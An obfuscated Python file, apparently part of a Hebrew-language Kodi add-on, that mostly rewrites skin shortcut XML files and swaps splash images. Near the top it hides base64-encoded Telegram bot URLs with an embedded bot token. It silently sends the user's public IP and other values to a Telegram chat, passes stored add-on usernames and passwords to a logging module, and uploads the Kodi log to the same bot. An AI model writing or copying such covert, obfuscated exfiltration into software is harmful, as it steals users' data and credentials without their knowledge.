          O0OOO0O0OOO0O00OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:576
          O0OO00OOOOO0OOOO0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:577
          OO00O0O000O0OO00O =str (json .loads (O0OO00OOOOO0OOOO0 )['ip'])#line:578
          O00O0OO000O0O0O00 =OO000OO00O0O00O00 #line:579
          OOO000O0OO0OOO0OO =OO00OO0OOOO0OO0O0 #line:580
          import socket #line:582
          O0OO00OOOOO0OOOO0 =urllib2 .urlopen (O0OOO0O0OOO0O00OO .decode ('base64')+' - '+O00O0OO000O0O0O00 +' - '+OOO000O0OO0OOO0OO +' - '+OO0O0O000O00O0O0O ).readlines ()#line:583
       except :pass #line:584
def googleindicat ():#line:587
			import logg #line:588
			OO00O0000000O0O0O =(ADDON .getSetting ("pass"))#line:589
			OO000O000OOO0OOO0 =(ADDON .getSetting ("user"))#line:590
			logg .logGA (OO00O0000000O0O0O ,OO000O000OOO0OOO0 )#line:591
def logsend ():#line:592
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:593
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:594
      howsentlog ()#line:596
      import requests #line:597
      if xbmc .getCondVisibility ('system.platform.windows'):#line:598
         OOO00OO0OOOOOOO00 =xbmc .translatePath ('special://home/kodi.log')#line:599
         OO00000O0O0O0O000 ={'chat_id':(None ,'-274262389'),'document':(OOO00OO0OOOOOOO00 ,open (OOO00OO0OOOOOOO00 ,'rb')),}#line:603
         O000OOOO000O0O000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:604
         O0OOO00OO0O00O0O0 =requests .post (O000OOOO000O0O000 .decode ('base64'),files =OO00000O0O0O0O000 )#line:606
      elif xbmc .getCondVisibility ('system.platform.android'):#line:607
           OOO00OO0OOOOOOO00 =xbmc .translatePath ('special://temp/kodi.log')#line:608
           OO00000O0O0O0O000 ={'chat_id':(None ,'-274262389'),'document':(OOO00OO0OOOOOOO00 ,open (OOO00OO0OOOOOOO00 ,'rb')),}#line:612
           O000OOOO000O0O000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:613
           O0OOO00OO0O00O0O0 =requests .post (O000OOOO000O0O000 .decode ('base64'),files =OO00000O0O0O0O000 )#line:615
      else :#line:616
           OOO00OO0OOOOOOO00 =xbmc .translatePath ('special://kodi.log')#line:617
           OO00000O0O0O0O000 ={'chat_id':(None ,'-274262389'),'document':(OOO00OO0OOOOOOO00 ,open (OOO00OO0OOOOOOO00 ,'rb')),}#line:621
           O000OOOO000O0O000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:622
           O0OOO00OO0O00O0O0 =requests .post (O000OOOO000O0O000 .decode ('base64'),files =OO00000O0O0O0O000 )#line:624
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:625
def rdoff ():#line:627
	O00O0O000O00000OO =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:658
	OO0OOO0000O00O000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:659
	copyfile (O00O0O000O00000OO ,OO0OOO0000O00O000 )#line:660
def skindialogsettind18 ():#line:661
	try :#line:662
		O0000OO000OOOOOOO =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:663
		O00O00000O0O0O0O0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:664
		copyfile (O0000OO000OOOOOOO ,O00O00000O0O0O0O0 )#line:665
	except :pass #line:666
def rdon ():#line:667
	loginit .loginIt ('restore','all')#line:668
	O0OOO000O0OO0OO00 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:670
	OOOO00OOOO0O0O0OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:671
	copyfile (O0OOO000O0OO0OO00 ,OOOO00OOOO0O0O0OO )#line:672
def adults18 ():#line:674
  O0O00OOO0000O0OOO =(ADDON .getSetting ("adults"))#line:675
  if O0O00OOO0000O0OOO =='true':#line:676
    O00OOO000O0OOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:677
    with open (O00OOO000O0OOOO00 ,'r')as O00O0000OO00OOO00 :#line:678
      OO0O0OO00OO0OOOOO =O00O0000OO00OOO00 .read ()#line:679
    OO0O0OO00OO0OOOOO =OO0O0OO00OO0OOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:697
    with open (O00OOO000O0OOOO00 ,'w')as O00O0000OO00OOO00 :#line:700
      O00O0000OO00OOO00 .write (OO0O0OO00OO0OOOOO )#line:701
def rdbuildaddon ():#line:702
  O0O0OO00OOO0OOO00 =(ADDON .getSetting ("auto_rd"))#line:703
  if O0O0OO00OOO0OOO00 =='true':#line:704
    O000O0000O000000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:705
    with open (O000O0000O000000O ,'r')as OOO0O00OOO0O00O00 :#line:706
      O0OO0O000OOOOOO00 =OOO0O00OOO0O00O00 .read ()#line:707
    O0OO0O000OOOOOO00 =O0OO0O000OOOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:725
    with open (O000O0000O000000O ,'w')as OOO0O00OOO0O00O00 :#line:728
      OOO0O00OOO0O00O00 .write (O0OO0O000OOOOOO00 )#line:729
    O000O0000O000000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:733
    with open (O000O0000O000000O ,'r')as OOO0O00OOO0O00O00 :#line:734
      O0OO0O000OOOOOO00 =OOO0O00OOO0O00O00 .read ()#line:735
    O0OO0O000OOOOOO00 =O0OO0O000OOOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:753
    with open (O000O0000O000000O ,'w')as OOO0O00OOO0O00O00 :#line:756
      OOO0O00OOO0O00O00 .write (O0OO0O000OOOOOO00 )#line:757
    O000O0000O000000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:761
    with open (O000O0000O000000O ,'r')as OOO0O00OOO0O00O00 :#line:762
      O0OO0O000OOOOOO00 =OOO0O00OOO0O00O00 .read ()#line:763
    O0OO0O000OOOOOO00 =O0OO0O000OOOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:781
    with open (O000O0000O000000O ,'w')as OOO0O00OOO0O00O00 :#line:784
      OOO0O00OOO0O00O00 .write (O0OO0O000OOOOOO00 )#line:785
    O000O0000O000000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:789
    with open (O000O0000O000000O ,'r')as OOO0O00OOO0O00O00 :#line:790
      O0OO0O000OOOOOO00 =OOO0O00OOO0O00O00 .read ()#line:791
    O0OO0O000OOOOOO00 =O0OO0O000OOOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:809
    with open (O000O0000O000000O ,'w')as OOO0O00OOO0O00O00 :#line:812
      OOO0O00OOO0O00O00 .write (O0OO0O000OOOOOO00 )#line:813
    O000O0000O000000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:816
    with open (O000O0000O000000O ,'r')as OOO0O00OOO0O00O00 :#line:817
      O0OO0O000OOOOOO00 =OOO0O00OOO0O00O00 .read ()#line:818
    O0OO0O000OOOOOO00 =O0OO0O000OOOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:836
    with open (O000O0000O000000O ,'w')as OOO0O00OOO0O00O00 :#line:839
      OOO0O00OOO0O00O00 .write (O0OO0O000OOOOOO00 )#line:840
    O000O0000O000000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:842
    with open (O000O0000O000000O ,'r')as OOO0O00OOO0O00O00 :#line:843
      O0OO0O000OOOOOO00 =OOO0O00OOO0O00O00 .read ()#line:844
    O0OO0O000OOOOOO00 =O0OO0O000OOOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:862
    with open (O000O0000O000000O ,'w')as OOO0O00OOO0O00O00 :#line:865
      OOO0O00OOO0O00O00 .write (O0OO0O000OOOOOO00 )#line:866
    O000O0000O000000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:868
    with open (O000O0000O000000O ,'r')as OOO0O00OOO0O00O00 :#line:869
      O0OO0O000OOOOOO00 =OOO0O00OOO0O00O00 .read ()#line:870
    O0OO0O000OOOOOO00 =O0OO0O000OOOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:888
    with open (O000O0000O000000O ,'w')as OOO0O00OOO0O00O00 :#line:891
      OOO0O00OOO0O00O00 .write (O0OO0O000OOOOOO00 )#line:892
    O000O0000O000000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:895
    with open (O000O0000O000000O ,'r')as OOO0O00OOO0O00O00 :#line:896
      O0OO0O000OOOOOO00 =OOO0O00OOO0O00O00 .read ()#line:897
    O0OO0O000OOOOOO00 =O0OO0O000OOOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:915
    with open (O000O0000O000000O ,'w')as OOO0O00OOO0O00O00 :#line:918
      OOO0O00OOO0O00O00 .write (O0OO0O000OOOOOO00 )#line:919
def rdbuildinstall ():#line:922
  try :#line:923
   OO0OO0OOO0O0O00O0 =(ADDON .getSetting ("auto_rd"))#line:924
   if OO0OO0OOO0O0O00O0 =='true':#line:925
     OO00O0OO0OOO0OO00 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:926
     O0O0O0O000OO0O000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:927
     copyfile (OO00O0OO0OOO0OO00 ,O0O0O0O000OO0O000 )#line:928
  except :#line:929
     pass #line:930
def rdbuildaddonoff ():#line:933
    OO0OOOOO0OOO0O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:936
    with open (OO0OOOOO0OOO0O00O ,'r')as O000OO00OOO00O0OO :#line:937
      OO0O00O00O0OOO0O0 =O000OO00OOO00O0OO .read ()#line:938
    OO0O00O00O0OOO0O0 =OO0O00O00O0OOO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:956
    with open (OO0OOOOO0OOO0O00O ,'w')as O000OO00OOO00O0OO :#line:959
      O000OO00OOO00O0OO .write (OO0O00O00O0OOO0O0 )#line:960
    OO0OOOOO0OOO0O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:964
    with open (OO0OOOOO0OOO0O00O ,'r')as O000OO00OOO00O0OO :#line:965
      OO0O00O00O0OOO0O0 =O000OO00OOO00O0OO .read ()#line:966
    OO0O00O00O0OOO0O0 =OO0O00O00O0OOO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:984
    with open (OO0OOOOO0OOO0O00O ,'w')as O000OO00OOO00O0OO :#line:987
      O000OO00OOO00O0OO .write (OO0O00O00O0OOO0O0 )#line:988
    OO0OOOOO0OOO0O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:992
    with open (OO0OOOOO0OOO0O00O ,'r')as O000OO00OOO00O0OO :#line:993
      OO0O00O00O0OOO0O0 =O000OO00OOO00O0OO .read ()#line:994
    OO0O00O00O0OOO0O0 =OO0O00O00O0OOO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1012
    with open (OO0OOOOO0OOO0O00O ,'w')as O000OO00OOO00O0OO :#line:1015
      O000OO00OOO00O0OO .write (OO0O00O00O0OOO0O0 )#line:1016
    OO0OOOOO0OOO0O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1020
    with open (OO0OOOOO0OOO0O00O ,'r')as O000OO00OOO00O0OO :#line:1021
      OO0O00O00O0OOO0O0 =O000OO00OOO00O0OO .read ()#line:1022
    OO0O00O00O0OOO0O0 =OO0O00O00O0OOO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1040
    with open (OO0OOOOO0OOO0O00O ,'w')as O000OO00OOO00O0OO :#line:1043
      O000OO00OOO00O0OO .write (OO0O00O00O0OOO0O0 )#line:1044
    OO0OOOOO0OOO0O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1047
    with open (OO0OOOOO0OOO0O00O ,'r')as O000OO00OOO00O0OO :#line:1048
      OO0O00O00O0OOO0O0 =O000OO00OOO00O0OO .read ()#line:1049
    OO0O00O00O0OOO0O0 =OO0O00O00O0OOO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1067
    with open (OO0OOOOO0OOO0O00O ,'w')as O000OO00OOO00O0OO :#line:1070
      O000OO00OOO00O0OO .write (OO0O00O00O0OOO0O0 )#line:1071
    OO0OOOOO0OOO0O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1073
    with open (OO0OOOOO0OOO0O00O ,'r')as O000OO00OOO00O0OO :#line:1074
      OO0O00O00O0OOO0O0 =O000OO00OOO00O0OO .read ()#line:1075
    OO0O00O00O0OOO0O0 =OO0O00O00O0OOO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1093
    with open (OO0OOOOO0OOO0O00O ,'w')as O000OO00OOO00O0OO :#line:1096
      O000OO00OOO00O0OO .write (OO0O00O00O0OOO0O0 )#line:1097
    OO0OOOOO0OOO0O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1099
    with open (OO0OOOOO0OOO0O00O ,'r')as O000OO00OOO00O0OO :#line:1100
      OO0O00O00O0OOO0O0 =O000OO00OOO00O0OO .read ()#line:1101
    OO0O00O00O0OOO0O0 =OO0O00O00O0OOO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1119
    with open (OO0OOOOO0OOO0O00O ,'w')as O000OO00OOO00O0OO :#line:1122
      O000OO00OOO00O0OO .write (OO0O00O00O0OOO0O0 )#line:1123
    OO0OOOOO0OOO0O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1126
    with open (OO0OOOOO0OOO0O00O ,'r')as O000OO00OOO00O0OO :#line:1127
      OO0O00O00O0OOO0O0 =O000OO00OOO00O0OO .read ()#line:1128
    OO0O00O00O0OOO0O0 =OO0O00O00O0OOO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1146
    with open (OO0OOOOO0OOO0O00O ,'w')as O000OO00OOO00O0OO :#line:1149
      O000OO00OOO00O0OO .write (OO0O00O00O0OOO0O0 )#line:1150
def rdbuildinstalloff ():#line:1153
    try :#line:1154
       O000O000O00O0OOOO =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1155
       OOOOO000000OO00OO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1156
       copyfile (O000O000O00O0OOOO ,OOOOO000000OO00OO )#line:1158
       O000O000O00O0OOOO =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1160
       OOOOO000000OO00OO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1161
       copyfile (O000O000O00O0OOOO ,OOOOO000000OO00OO )#line:1163
       O000O000O00O0OOOO =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1165
       OOOOO000000OO00OO =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1166
       copyfile (O000O000O00O0OOOO ,OOOOO000000OO00OO )#line:1168
       O000O000O00O0OOOO =ADDONPATH +"/resources/rdoff/Splash.png"#line:1171
       OOOOO000000OO00OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1172
       copyfile (O000O000O00O0OOOO ,OOOOO000000OO00OO )#line:1174
    except :#line:1176
       pass #line:1177
def rdbuildaddonON ():#line:1184
    O000O0OOOO0O00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1186
    with open (O000O0OOOO0O00OOO ,'r')as OOOO00OOO0O0OOOO0 :#line:1187
      OOO0O00OO0OOOO0O0 =OOOO00OOO0O0OOOO0 .read ()#line:1188
    OOO0O00OO0OOOO0O0 =OOO0O00OO0OOOO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1206
    with open (O000O0OOOO0O00OOO ,'w')as OOOO00OOO0O0OOOO0 :#line:1209
      OOOO00OOO0O0OOOO0 .write (OOO0O00OO0OOOO0O0 )#line:1210
    O000O0OOOO0O00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1214
    with open (O000O0OOOO0O00OOO ,'r')as OOOO00OOO0O0OOOO0 :#line:1215
      OOO0O00OO0OOOO0O0 =OOOO00OOO0O0OOOO0 .read ()#line:1216
    OOO0O00OO0OOOO0O0 =OOO0O00OO0OOOO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
